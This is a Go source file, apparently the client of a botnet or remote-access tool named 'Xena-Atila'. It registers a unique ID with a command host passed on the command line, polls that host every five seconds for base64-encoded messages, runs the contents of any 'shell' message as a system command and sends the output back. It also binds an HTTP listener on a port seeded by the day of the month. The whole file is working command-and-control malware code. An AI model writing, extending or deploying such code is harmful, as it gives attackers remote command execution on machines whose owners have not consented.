package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"

	"github.com/google/uuid"
)

// Xena-Atila.
var centralizedHost string = os.Args[1]

// Generate the unique identifier.
var id uuid.UUID = uuid.New()

/* Internet Address. */
type InternetAddress struct {
	// x, y, z, w make a complate internet addres. Examples: 127.0.0.1, 168.168.1.1, 255.255.255.255, etc...
	X uint8 `json:"x"`
	Y uint8 `json:"y"`
	Z uint8 `json:"z"`
	W uint8 `json:"w"`
}

/* Internet Port */
type InternetPort uint16

/* Entity. */
type Entity struct {
	// Unique identifier.
	Id string `json:"id"`
	// Internet address of node.
	Address InternetAddress `json:"internetAddress"`
	// Time object of when this entity was created.
	CreatedAt int64 `json:"createdAt"`
}

/* Message. */
type Message struct {
	// Unique identifier.
	Id string `json:"id"`
	// Node which originally issued the message.
	From string `json:"from"`
	// Which node should receive message.
	To string `json:"to"`
	// Key used for rounting of the content into different code paths.
	Subject string `json:"subject"`
	// Base64 encoded data.
	Content string `json:"content"`
	// Message's state.
	Status string `json:"status"`
	// Original message ID.
	ReplyTo string `json:"replyTo"`
	// Time object of when was this message created.
	// CreatedAt int64 `json:"createdAt"`
}

/* Entity storage. */
var entities = make(map[string]Entity)
var messages = make(map[string]Message)

/* Helper functions - start */

// Returns a new port which should be used for binding onto the network.
func currentActivePort() int {
	// Day of the month set as the seed.
	rand.Seed(int64(time.Now().Day()))
	return rand.Intn(60666-3003) + 3003
}

/* Helper functions - end */

/* Global request handler. */
func globalRequestHandler(response http.ResponseWriter, request *http.Request) {
	/*
		Check the message subject and pass the message's content accodringly.
		Log if message was mailformed. All anomalies should be inspected or something.

		1) How to define a threshold at which communication anomalies occure?
		2) In which format should the logged request be stored and where?
		3) Should we at least inform the other party of request failing?
	*/

	// Read and prepare the body.
	jsonDecoder := json.NewDecoder(request.Body)
	jsonDecoder.DisallowUnknownFields()

	// Newly created entity.
	var messageJson Message

	// Decode the body.
	err := jsonDecoder.Decode(&messageJson)
	if err != nil {
		parseJsonDecoderError(err, &response)
		return
	}

	// Store the message.
	messages[messageJson.Id] = messageJson

	fmt.Println(messageJson.Subject)

	fmt.Fprintf(response, "%+v", messages)
}

func parseJsonDecoderError(err error, response *http.ResponseWriter) {
	var syntaxError *json.SyntaxError
	var unmarshalTypeError *json.UnmarshalTypeError

	switch {
	// Catch any syntax errors in the JSON and send an error message
	// which interpolates the location of the problem to make it
	// easier for the client to fix.
	case errors.As(err, &syntaxError):
		msg := fmt.Sprintf("Request body contains badly-formed JSON (at position %d)", syntaxError.Offset)
		http.Error(*response, msg, http.StatusBadRequest)

	// In some circumstances Decode() may also return an
	// io.ErrUnexpectedEOF error for syntax errors in the JSON. There
	// is an open issue regarding this at
	// https://github.com/golang/go/issues/25956.
	case errors.Is(err, io.ErrUnexpectedEOF):
		msg := fmt.Sprintf("Request body contains badly-formed JSON")
		http.Error(*response, msg, http.StatusBadRequest)

	// Catch any type errors, like trying to assign a string in the
	// JSON request body to a int field in our Person struct. We can
	// interpolate the relevant field name and position into the error
	// message to make it easier for the client to fix.
	case errors.As(err, &unmarshalTypeError):
		msg := fmt.Sprintf("Request body contains an invalid value for the %q field (at position %d)", unmarshalTypeError.Field, unmarshalTypeError.Offset)
		http.Error(*response, msg, http.StatusBadRequest)

	// Catch the error caused by extra unexpected fields in the request
	// body. We extract the field name from the error message and
	// interpolate it in our custom error message. There is an open
	// issue at https://github.com/golang/go/issues/29035 regarding
	// turning this into a sentinel error.
	case strings.HasPrefix(err.Error(), "json: unknown field "):
		fieldName := strings.TrimPrefix(err.Error(), "json: unknown field ")
		msg := fmt.Sprintf("Request body contains unknown field %s", fieldName)
		http.Error(*response, msg, http.StatusBadRequest)

	// An io.EOF error is returned by Decode() if the request body is
	// empty.
	case errors.Is(err, io.EOF):
		msg := "Request body must not be empty"
		http.Error(*response, msg, http.StatusBadRequest)

	// Catch the error caused by the request body being too large. Again
	// there is an open issue regarding turning this into a sentinel
	// error at https://github.com/golang/go/issues/30715.
	case err.Error() == "http: request body too large":
		msg := "Request body must not be larger than 1MB"
		http.Error(*response, msg, http.StatusRequestEntityTooLarge)

	// Otherwise default to logging the error and sending a 500 Internal
	// Server Error response.
	default:
		log.Println(err.Error())
		http.Error(*response, http.StatusText(http.StatusInternalServerError), http.StatusInternalServerError)
	}
}

func identify(id string) {
	insertionPayload := []byte(`{"id":"` + id + `","status":"ALIVE"}`)

	request, err := http.NewRequest("POST", centralizedHost+"/v1/clients", bytes.NewBuffer(insertionPayload))
	request.Header.Set("Content-Type", "application/json")
	if err != nil {
		fmt.Println("Unable to connect to the centralized host.")
	}

	client := &http.Client{}
	response, err := client.Do(request)
	defer response.Body.Close()
}

func fetchAndInterpretMessages(id string) {
	for range time.Tick(time.Second * 5) {
		response, err := http.Get(centralizedHost + "/v1/messages?status=SENT&clientId=" + id)
		if err != nil {
			fmt.Printf(err.Error())
		}

		jsonDecoder := json.NewDecoder(response.Body)
		jsonDecoder.DisallowUnknownFields()

		var messages []Message

		errJson := jsonDecoder.Decode(&messages)
		if errJson != nil {
			fmt.Println("Failed to parse the message.")
			fmt.Println(errJson.Error())
			continue
		}

		interpretMessages(messages)
	}
}

func issueMessageReply(content string, replyTo string) {
	type ReplyMessage struct {
		// Node which originally issued the message.
		From string `json:"from"`
		// Key used for rounting of the content into different code paths.
		Subject string `json:"subject"`
		// Base64 encoded data.
		Content string `json:"content"`
		// Message ID.
		ReplyTo string `json:"replyTo"`
	}

	replyMessage := ReplyMessage{
		Subject: "shell-output",
		From:    id.String(),
		Content: content,
		ReplyTo: replyTo,
	}

	insertionPayload, marshalErr := json.Marshal(replyMessage)
	if marshalErr != nil {
		fmt.Println(marshalErr.Error())
	}

	request, err := http.NewRequest("POST", centralizedHost+"/v1/messages", bytes.NewBuffer(insertionPayload))
	request.Header.Set("Content-Type", "application/json")
	if err != nil {
		fmt.Println("Unable to connect to the centralized host.")
	}

	client := &http.Client{}
	response, err := client.Do(request)
	defer response.Body.Close()

	messageAck(replyTo)
}

func interpretMessages(messages []Message) {
	for messageIndex := 0; messageIndex < len(messages); messageIndex++ {
		message := messages[messageIndex]

		decodedContent, err := base64.StdEncoding.DecodeString(message.Content)
		if err != nil {
			fmt.Println(err.Error())
			continue
		}

		fmt.Print("New command: ")
		fmt.Println(decodedContent)

		switch message.Subject {
		case "shell":
			cmd := exec.Command(strings.TrimSuffix(string(decodedContent[:]), "\n"))
			var out bytes.Buffer
			cmd.Stdout = &out

			cmdErr := cmd.Run()
			if cmdErr != nil {
				fmt.Println(cmdErr)
				continue
			}

			cmdOutput := base64.StdEncoding.EncodeToString(out.Bytes())

			issueMessageReply(cmdOutput, message.Id)
		}
	}
}

func messageAck(messageId string) {
	ackPayload := []byte(`{"id":"` + messageId + `","status":"SEEN"}`)

	request, err := http.NewRequest("POST", centralizedHost+"/v1/messages/ack", bytes.NewBuffer(ackPayload))
	request.Header.Set("Content-Type", "application/json")
	if err != nil {
		fmt.Println("Unable to connect to the centralized host.")
	}

	client := &http.Client{}
	response, err := client.Do(request)
	defer response.Body.Close()
}

func main() {
	fmt.Println(id)

	identify(id.String())

	go fetchAndInterpretMessages(id.String())

	// Our main router.
	http.HandleFunc("/", globalRequestHandler)

	// Generate a port to which we may bind to.
	appPort := currentActivePort()

	// Boot our HTTP web server.
	// Later we shall change server's port based on the current time.
bootServer:
	fmt.Println("Trying port", appPort)
	error := http.ListenAndServe(":"+strconv.Itoa(appPort), nil)
	if error != nil {
		appPort++
		goto bootServer
	}
}
